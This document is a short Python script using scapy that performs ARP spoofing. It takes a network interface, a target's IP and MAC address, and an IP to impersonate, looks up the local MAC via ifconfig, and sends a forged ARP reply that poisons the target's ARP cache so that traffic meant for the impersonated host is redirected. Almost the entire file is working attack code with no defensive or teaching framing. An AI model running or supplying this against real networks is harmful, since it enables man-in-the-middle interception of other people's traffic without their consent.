#!/usr/bin/python3

import argparse, re, subprocess
import scapy.all as scapy

def parsing():
    
    parser = argparse.ArgumentParser()
    
    parser.add_argument("-i", "--interface", dest="interface", help="Interfece which you want to use")
    parser.add_argument("-t", "--target", dest="ip", help="Target ip you want to spoof")
    parser.add_argument("-s", "--supplant", dest="sip", help="Ip you want to impersonate")
    parser.add_argument("-m", "--mac", dest="mac", help="Target mac address you want to spoof")

    args = parser.parse_args()

    if not args.interface:
        parser.error("[-] Please, specify an interface")
    if not args.ip:
        parser.error("[-] Please, specify your target ip")
    elif not args.mac:
        parser.error("[-] Please, specify your target mac")
    elif not args.sip:
        parser.error("[-] Please, specify the ip you want to supplant")

    return args

def arp_response(ip, mac, sip, my_mac):

    resp_packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=sip, hwsrc=my_mac)
    scapy.send(resp_packet)

def getting_mac(interface):

    ifconfig_result = subprocess.check_output(["ifconfig", interface])
    ifconfig_text = ifconfig_result.decode('utf-8')
    mac_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_text)
    if mac_result:
        return mac_result.group(0)
    else:
        print("[-] Could not find MAC address")

# Calling functions

args = parsing()
my_mac = getting_mac(args.interface)
arp = arp_response(args.ip, args.mac, args.sip, my_mac)

